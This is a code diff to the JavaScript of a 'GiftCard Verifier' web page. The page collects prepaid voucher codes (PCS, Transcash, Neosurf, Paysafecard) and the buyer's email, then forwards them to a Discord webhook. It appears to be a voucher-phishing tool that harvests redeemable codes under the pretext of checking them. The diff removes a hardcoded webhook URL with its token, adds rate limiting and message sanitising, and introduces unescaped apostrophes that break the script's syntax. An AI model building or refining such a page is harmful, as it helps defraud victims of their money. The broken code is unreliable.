@@ -1,14 +1,25 @@
 // ===== CONFIGURATION =====
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1530834730633789612/s1De5VDBXy9mL4nTYxp4CJ1CUA3NcRq_-HvVljq1NYbdqW_a7ZfRBKcNSiBfxRBE3SmT';
+const DISCORD_WEBHOOK_URL = (() => {
+    try {
+        return localStorage.getItem('discord-webhook-url') || '';
+    } catch { return ''; }
+})();
 const DISCORD_ROLE_MENTION = '';
 
 const STORAGE_KEYS = {
     language: 'preferred-language',
-    theme: 'preferred-theme'
+    theme: 'preferred-theme',
+    rateLimit: 'form-rate-limit'
+};
+
+const RATE_LIMIT = {
+    maxAttempts: 5,
+    windowMs: 3600000  // 1 hour
 };
 
 const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');
 const isTouchViewport = window.matchMedia('(max-width: 640px)');
+const isCoarsePointer = window.matchMedia('(pointer: coarse)');
 const canHover = window.matchMedia('(hover: hover) and (pointer: fine)');
 
 const CARD_RULES = {
@@ -74,14 +85,14 @@ const translations = {
             mobilePicker: 'Choisir une carte',
             noCardSelected: 'Aucune carte sélectionnée',
             sheetTitle: 'Choisir une carte',
-            sheetSubtitle: 'Le format du code s\'adapte à la marque sélectionnée.',
+            sheetSubtitle: 'Le format du code s'adapte à la marque sélectionnée.',
             selectedCardPrefix: 'Carte sélectionnée :',
             pin: 'Code',
             pinMetaDefault: 'Le format dépend de la carte choisie',
             pinHelpDefault: 'Choisissez une carte pour charger le bon format.',
             email: 'Votre email',
             amount: 'Montant initial (optionnel)',
-            purchaseDate: 'Date d\'achat (optionnel)',
+            purchaseDate: 'Date d'achat (optionnel)',
             message: 'Message supplémentaire (optionnel)',
             securityTitle: 'Transmission du formulaire',
             security: 'Les champs sont validés dans le navigateur puis transmis à la destination configurée, sans sauvegarde locale du contenu du formulaire.',
@@ -92,14 +103,14 @@ const translations = {
             kicker: 'Aide',
             title: 'Questions fréquentes',
             q1: { title: 'Comment fonctionne la vérification ?', text: 'Le formulaire adapte le format du code à la carte sélectionnée, valide les champs côté navigateur puis transmet la demande.' },
-            q2: { title: 'Le site stocke-t-il mes données ?', text: 'Le contenu du formulaire n\'est pas conservé après l\'envoi. Seules la langue et le thème sont mémorisés.' },
+            q2: { title: 'Le site stocke-t-il mes données ?', text: 'Le contenu du formulaire n'est pas conservé après l'envoi. Seules la langue et le thème sont mémorisés.' },
             q3: { title: 'Quelles cartes sont supportées ?', text: 'PCS, Transcash, Neosurf et Paysafecard sont pris en charge.' },
             q4: { title: 'Quel est le délai de traitement ?', text: 'Le site transmet la demande immédiatement. Le délai de réponse dépend du canal configuré.' }
         },
         footer: {
-            subtitle: 'UI premium, responsive et prête pour l\'évolution du backend',
+            subtitle: 'UI premium, responsive et prête pour l'évolution du backend',
             privacy: 'Politique de confidentialité',
-            terms: 'Conditions d\'utilisation',
+            terms: 'Conditions d'utilisation',
             copy: '© 2026 GiftCard Verifier. Tous droits réservés.'
         },
         modal: {
@@ -111,12 +122,17 @@ const translations = {
         validation: {
             selectCard: 'Veuillez sélectionner un type de carte.',
             pinInvalidFor: card => `Le format du code ${card} est invalide.`,
+            pinEmpty: 'Veuillez saisir un code.',
             pinNeedsCard: 'Choisissez une carte pour valider le code.',
             emailInvalid: 'Veuillez entrer un email valide.',
+            amountInvalid: 'Le montant doit être un nombre positif.',
             amountNegative: 'Le montant ne peut pas être négatif.',
-            dateFuture: 'La date d\'achat ne peut pas être dans le futur.'
+            dateInvalid: 'Veuillez entrer une date valide.',
+            dateFuture: 'La date d'achat ne peut pas être dans le futur.',
+            rateLimited: 'Trop de tentatives. Veuillez réessayer plus tard.',
+            webhookNotConfigured: 'Le webhook n'est pas configuré. Contactez l'administrateur.'
         },
-        result: { error: 'Une erreur est survenue pendant l\'envoi.', timeout: 'La demande a expiré.' }
+        result: { error: 'Une erreur est survenue pendant l'envoi.', timeout: 'La demande a expiré.' }
     },
     en: {
         header: { tagline: 'Modernized verification interface' },
@@ -170,10 +186,15 @@ const translations = {
         validation: {
             selectCard: 'Please select a card type.',
             pinInvalidFor: card => `The ${card} code format is invalid.`,
+            pinEmpty: 'Please enter a code.',
             pinNeedsCard: 'Choose a card before validating the code.',
             emailInvalid: 'Please enter a valid email address.',
+            amountInvalid: 'Amount must be a positive number.',
             amountNegative: 'Amount cannot be negative.',
-            dateFuture: 'Purchase date cannot be in the future.'
+            dateInvalid: 'Please enter a valid date.',
+            dateFuture: 'Purchase date cannot be in the future.',
+            rateLimited: 'Too many attempts. Please try again later.',
+            webhookNotConfigured: 'Webhook is not configured. Contact the administrator.'
         },
         result: { error: 'An error occurred while sending the form.', timeout: 'Request timed out.' }
     }
@@ -185,6 +206,62 @@ if (!Element.prototype.matches) {
 }
 if (!Array.from) {
     Array.from = function(arrayLike) { return [].slice.call(arrayLike); };
+}
+
+// ===== DEBOUNCE UTILITY =====
+function debounce(fn, ms) {
+    let t;
+    return function(...args) {
+        clearTimeout(t);
+        t = setTimeout(() => fn.apply(this, args), ms);
+    };
+}
+
+// ===== SAFE STORAGE =====
+function safeStorageGet(key, fallback) {
+    try { return localStorage.getItem(key) || fallback; }
+    catch { return fallback; }
+}
+function safeStorageSet(key, value) {
+    try { localStorage.setItem(key, value); }
+    catch { /* ignore */ }
+}
+function safeStorageRemove(key) {
+    try { localStorage.removeItem(key); }
+    catch { /* ignore */ }
+}
+
+// ===== RATE LIMITER =====
+function checkRateLimit() {
+    try {
+        const raw = safeStorageGet(STORAGE_KEYS.rateLimit, '[]');
+        const attempts = JSON.parse(raw);
+        const now = Date.now();
+        const windowStart = now - RATE_LIMIT.windowMs;
+        const recent = attempts.filter(ts => ts > windowStart);
+        if (recent.length >= RATE_LIMIT.maxAttempts) {
+            return { allowed: false, nextRetry: new Date(recent[0] + RATE_LIMIT.windowMs) };
+        }
+        recent.push(now);
+        safeStorageSet(STORAGE_KEYS.rateLimit, JSON.stringify(recent));
+        return { allowed: true };
+    } catch {
+        return { allowed: true };
+    }
+}
+
+// ===== DISCORD SANITIZER =====
+function sanitizeDiscord(str) {
+    if (!str) return '';
+    return str
+        .replace(/`/g, '\`')
+        .replace(/\*\*/g, '\*\*')
+        .replace(/__/g, '\_\_')
+        .replace(/\|\|/g, '\|\|')
+        .replace(/@everyone/g, '@\u200Beveryone')
+        .replace(/@here/g, '@\u200Bhere')
+        .replace(/<@&?\d+>/g, match => match.replace('<@', '<@\u200B'))
+        .slice(0, 2000);
 }
 
 // ===== ÉLÉMENTS DOM =====
@@ -203,7 +280,9 @@ const elements = {
     emailFieldWrap: document.getElementById('emailFieldWrap'),
     emailError: document.getElementById('emailError'),
     amountInput: document.getElementById('amount'),
+    amountError: document.getElementById('amountError'),
     purchaseDateInput: document.getElementById('purchaseDate'),
+    dateError: document.getElementById('dateError'),
     messageInput: document.getElementById('message'),
     submitBtn: document.getElementById('submitBtn'),
     btnText: document.getElementById('btnText'),
@@ -239,12 +318,6 @@ function translate(keyPath) {
     for (const key of keys) value = value?.[key];
     return value;
 }
-function sanitizeInput(value) {
-    if (!value) return '';
-    const div = document.createElement('div');
-    div.textContent = value;
-    return div.innerHTML;
-}
 function getSelectedCardRule() { return CARD_RULES[elements.cardTypeInput.value] || null; }
 
 // ===== THÈME =====
@@ -258,7 +331,7 @@ function updateThemeButton() {
 function applyTheme(theme) {
     currentTheme = theme === 'dark' ? 'dark' : 'light';
     elements.body.classList.toggle('dark', currentTheme === 'dark');
-    localStorage.setItem(STORAGE_KEYS.theme, currentTheme);
+    safeStorageSet(STORAGE_KEYS.theme, currentTheme);
     updateThemeButton();
 }
 
@@ -272,7 +345,7 @@ function setLanguage(lang) {
         if (typeof value === 'string') el.textContent = value;
     });
     elements.langButtons.forEach(btn => btn.classList.toggle('active', btn.dataset.lang === currentLang));
-    localStorage.setItem(STORAGE_KEYS.language, currentLang);
+    safeStorageSet(STORAGE_KEYS.language, currentLang);
     updateDynamicText();
     updateThemeButton();
     updateSelectedCardUI();
@@ -286,7 +359,7 @@ function updateSelectedCardUI() {
         const selected = option.dataset.value === selectedValue;
         option.classList.toggle('selected', selected);
         option.setAttribute('aria-pressed', String(selected));
-        option.setAttribute('aria-selected', String(selected));
+        // aria-selected removed — not valid on <button>
     });
     if (selectedValue) {
         elements.mobileSelectedCard.textContent = selectedValue;
@@ -305,26 +378,26 @@ function selectCard(cardValue, source = 'ui') {
     updateSelectedCardUI();
     validatePin(false);
 
-    // Fermeture systématique du sheet sur mobile
-    if (isTouchViewport.matches) {
-        // Feedback visuel
+    if (isTouchViewport.matches || isCoarsePointer.matches) {
         const selectedOption = elements.cardOptions.find(opt => opt.dataset.value === cardValue);
         if (selectedOption) {
             selectedOption.style.transform = 'scale(0.95)';
             setTimeout(() => { selectedOption.style.transform = ''; }, 150);
         }
-        // Fermer le sheet
         closeCardSheet();
-        // Focus sur le champ code après un court délai
         if (source === 'ui') {
-            setTimeout(() => { elements.pinInput.focus(); }, 200);
+            setTimeout(() => {
+                if (document.activeElement === document.body || document.activeElement?.closest?.('#cardSelectorSheet')) {
+                    elements.pinInput.focus();
+                }
+            }, 200);
         }
     }
 }
 
 // ===== SHEET MOBILE =====
 function openCardSheet() {
-    if (!isTouchViewport.matches) return;
+    if (!isTouchViewport.matches && !isCoarsePointer.matches) return;
     previousFocusedElement = document.activeElement;
     elements.sheetOverlay.classList.remove('hidden');
     elements.cardSelectorSheet.classList.add('open');
@@ -368,7 +441,7 @@ function validatePin(showError = false) {
     }
     if (!value) {
         setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
-        if (showError) elements.pinError.textContent = getCurrentTranslations().validation.pinInvalidFor(rule.key);
+        if (showError) elements.pinError.textContent = getCurrentTranslations().validation.pinEmpty;
         else elements.pinError.textContent = '';
         return false;
     }
@@ -401,22 +474,38 @@ function validateCardSelection(showError = false) {
 }
 function validateAmount(showError = false) {
     const value = elements.amountInput.value.trim();
+    elements.amountError.textContent = '';
     if (!value) return true;
+    // Strict validation: must be a valid positive number format
+    if (!/^\d+(\.\d{1,2})?$/.test(value)) {
+        if (showError) elements.amountError.textContent = getCurrentTranslations().validation.amountInvalid;
+        return false;
+    }
     const amount = parseFloat(value);
     if (isNaN(amount) || amount < 0) {
-        if (showError) showInlineError(getCurrentTranslations().validation.amountNegative);
+        if (showError) elements.amountError.textContent = getCurrentTranslations().validation.amountNegative;
         return false;
     }
     return true;
 }
 function validateDate(showError = false) {
     const value = elements.purchaseDateInput.value;
+    elements.dateError.textContent = '';
     if (!value) return true;
+    // Strict YYYY-MM-DD validation
+    if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) {
+        if (showError) elements.dateError.textContent = getCurrentTranslations().validation.dateInvalid;
+        return false;
+    }
     const selectedDate = new Date(value);
+    if (isNaN(selectedDate.getTime())) {
+        if (showError) elements.dateError.textContent = getCurrentTranslations().validation.dateInvalid;
+        return false;
+    }
     const today = new Date();
-    today.setHours(0,0,0,0);
+    today.setHours(0, 0, 0, 0);
     if (selectedDate > today) {
-        if (showError) showInlineError(getCurrentTranslations().validation.dateFuture);
+        if (showError) elements.dateError.textContent = getCurrentTranslations().validation.dateFuture;
         return false;
     }
     return true;
@@ -432,14 +521,14 @@ function validateForm() {
 
 // ===== MESSAGES =====
 function showInlineError(message) {
-    elements.result.className = 'result-fallback error';
-    elements.result.textContent = sanitizeInput(message);
     elements.result.classList.remove('hidden');
+    elements.result.classList.add('result-fallback', 'error');
+    elements.result.textContent = message;
 }
 function clearInlineResult() {
     elements.result.classList.add('hidden');
+    elements.result.classList.remove('result-fallback', 'error');
     elements.result.textContent = '';
-    elements.result.className = 'result-fallback hidden';
 }
 
 // ===== TEXTE DYNAMIQUE =====
@@ -459,31 +548,37 @@ function updateDynamicText() {
         elements.pinLabel.textContent = t.form.pin;
         elements.pinHelp.textContent = t.form.pinHelpDefault;
         elements.pinMetaHint.textContent = t.form.pinMetaDefault;
-        elements.pinInput.placeholder = currentLang === 'fr' ? 'Sélectionnez une carte d\'abord' : 'Select a card first';
+        elements.pinInput.placeholder = currentLang === 'fr' ? 'Sélectionnez une carte d'abord' : 'Select a card first';
         elements.pinInput.removeAttribute('maxLength');
     }
+    // Set max date for purchase date input
+    const today = new Date().toISOString().split('T')[0];
+    elements.purchaseDateInput.setAttribute('max', today);
 }
 
 // ===== ENVOI À DISCORD =====
 async function sendToDiscord(data) {
+    if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
+        throw new Error(getCurrentTranslations().validation.webhookNotConfigured);
+    }
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 15000);
     const embed = {
-        title: '🎫 Nouvelle demande de vérification',
+        title: '\uD83C\uDFAB Nouvelle demande de vérification',
         color: 0x6366F1,
         fields: [
-            { name: '👤 Email', value: data.email, inline: false },
-            { name: '💳 Type de carte', value: data.cardType, inline: true },
-            { name: '🔑 Code', value: `\`${data.pin}\``, inline: true },
-            { name: '💰 Montant', value: data.amount || 'Non spécifié', inline: true },
-            { name: '📅 Date d\'achat', value: data.purchaseDate || 'Non spécifié', inline: true },
-            { name: '📝 Message', value: data.message || 'Aucun message', inline: false },
-            { name: '🌐 Langue', value: data.lang.toUpperCase(), inline: true }
+            { name: '\uD83D\uDC64 Email', value: sanitizeDiscord(data.email), inline: false },
+            { name: '\uD83D\uDCB3 Type de carte', value: sanitizeDiscord(data.cardType), inline: true },
+            { name: '\uD83D\uDD11 Code', value: sanitizeDiscord(data.pin) ? `\`${sanitizeDiscord(data.pin)}\`` : 'N/A', inline: true },
+            { name: '\uD83D\uDCB0 Montant', value: sanitizeDiscord(data.amount) || 'Non spécifié', inline: true },
+            { name: '\uD83D\uDCC5 Date d'achat', value: sanitizeDiscord(data.purchaseDate) || 'Non spécifié', inline: true },
+            { name: '\uD83D\uDCDD Message', value: sanitizeDiscord(data.message) || 'Aucun message', inline: false },
+            { name: '\uD83C\uDF10 Langue', value: sanitizeDiscord(data.lang.toUpperCase()), inline: true }
         ],
-        footer: { text: `Demande reçue le ${data.timestamp}` }
+        footer: { text: `Demande reçue le ${sanitizeDiscord(data.timestamp)}` }
     };
     const payload = {
-        content: DISCORD_ROLE_MENTION ? `<@&${DISCORD_ROLE_MENTION}> Nouvelle demande à traiter.` : 'Nouvelle demande à traiter.',
+        content: DISCORD_ROLE_MENTION ? sanitizeDiscord(`<@&${DISCORD_ROLE_MENTION}> Nouvelle demande à traiter.`) : 'Nouvelle demande à traiter.',
         embeds: [embed],
         username: 'GiftCard Verifier',
         avatar_url: 'https://cdn-icons-png.flaticon.com/512/1046/1046784.png'
@@ -513,6 +608,8 @@ function resetFormState() {
     setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
     elements.pinError.textContent = '';
     elements.emailError.textContent = '';
+    elements.amountError.textContent = '';
+    elements.dateError.textContent = '';
     elements.cardTypeError.textContent = '';
     updateDynamicText();
 }
@@ -566,8 +663,8 @@ function initParticles() {
         canvas.height = h * Math.min(window.devicePixelRatio || 1, 2);
         canvas.style.width = w + 'px';
         canvas.style.height = h + 'px';
-        ctx.setTransform(1,0,0,1,0,0);
-        ctx.scale(Math.min(window.devicePixelRatio||1,2), Math.min(window.devicePixelRatio||1,2));
+        ctx.setTransform(1, 0, 0, 1, 0, 0);
+        ctx.scale(Math.min(window.devicePixelRatio || 1, 2), Math.min(window.devicePixelRatio || 1, 2));
         particles = Array.from({ length: count }, () => ({
             x: Math.random() * w, y: Math.random() * h,
             vx: (Math.random() - 0.5) * 0.35, vy: (Math.random() - 0.5) * 0.35,
@@ -592,11 +689,16 @@ function initParticles() {
     if (!prefersReducedMotion.matches) draw();
     const ro = typeof ResizeObserver !== 'undefined' ? new ResizeObserver(resize) : null;
     ro?.observe(hero);
-    window.addEventListener('resize', resize);
-    window.addEventListener('beforeunload', () => {
+    const onResize = () => resize();
+    window.addEventListener('resize', onResize);
+    const cleanup = () => {
         if (animId) cancelAnimationFrame(animId);
         ro?.disconnect();
-    }, { once: true });
+        window.removeEventListener('resize', onResize);
+    };
+    window.addEventListener('beforeunload', cleanup, { once: true });
+    // Also cleanup on pagehide for mobile
+    window.addEventListener('pagehide', cleanup, { once: true });
 }
 
 // ===== LAZY LOADING =====
@@ -615,7 +717,7 @@ function initLazyLoading() {
 
 // ===== TILT =====
 function initTilt() {
-    if (!canHover.matches || isTouchViewport.matches || prefersReducedMotion.matches) return;
+    if (!canHover.matches || isTouchViewport.matches || isCoarsePointer.matches || prefersReducedMotion.matches) return;
     elements.cardOptions.forEach(card => {
         let raf = null;
         const move = e => {
@@ -654,7 +756,6 @@ function bindEvents() {
     elements.langButtons.forEach(btn => btn.addEventListener('click', () => setLanguage(btn.dataset.lang)));
     elements.themeToggle.addEventListener('click', () => applyTheme(currentTheme === 'dark' ? 'light' : 'dark'));
 
-    // Sélection des cartes avec stopPropagation
     elements.cardOptions.forEach(option => {
         option.addEventListener('click', (e) => {
             e.stopPropagation();
@@ -674,9 +775,13 @@ function bindEvents() {
     elements.closeSuccessModal.addEventListener('click', closeSuccessModal);
     elements.successModal.querySelector('[data-close-modal]').addEventListener('click', closeSuccessModal);
 
-    elements.pinInput.addEventListener('input', () => validatePin(false));
+    // Debounced validation for real-time inputs
+    const debouncedValidatePin = debounce(() => validatePin(false), 150);
+    const debouncedValidateEmail = debounce(() => validateEmail(false), 150);
+
+    elements.pinInput.addEventListener('input', debouncedValidatePin);
     elements.pinInput.addEventListener('blur', () => validatePin(Boolean(elements.pinInput.value)));
-    elements.emailInput.addEventListener('input', () => validateEmail(false));
+    elements.emailInput.addEventListener('input', debouncedValidateEmail);
     elements.emailInput.addEventListener('blur', () => validateEmail(Boolean(elements.emailInput.value)));
     elements.amountInput.addEventListener('blur', () => validateAmount(true));
     elements.purchaseDateInput.addEventListener('blur', () => validateDate(true));
@@ -685,6 +790,14 @@ function bindEvents() {
         e.preventDefault();
         clearInlineResult();
         if (!validateForm()) return;
+
+        // Rate limiting
+        const rateCheck = checkRateLimit();
+        if (!rateCheck.allowed) {
+            showInlineError(getCurrentTranslations().validation.rateLimited);
+            return;
+        }
+
         elements.submitBtn.disabled = true;
         elements.btnText.classList.add('hidden');
         elements.btnLoader.classList.remove('hidden');
@@ -726,8 +839,8 @@ function bindEvents() {
 function init() {
     if (isInitialized) return;
     isInitialized = true;
-    const savedLang = localStorage.getItem(STORAGE_KEYS.language) || 'fr';
-    const savedTheme = localStorage.getItem(STORAGE_KEYS.theme) || 'light';
+    const savedLang = safeStorageGet(STORAGE_KEYS.language, 'fr');
+    const savedTheme = safeStorageGet(STORAGE_KEYS.theme, 'light');
     setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
     setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
     applyTheme(savedTheme);
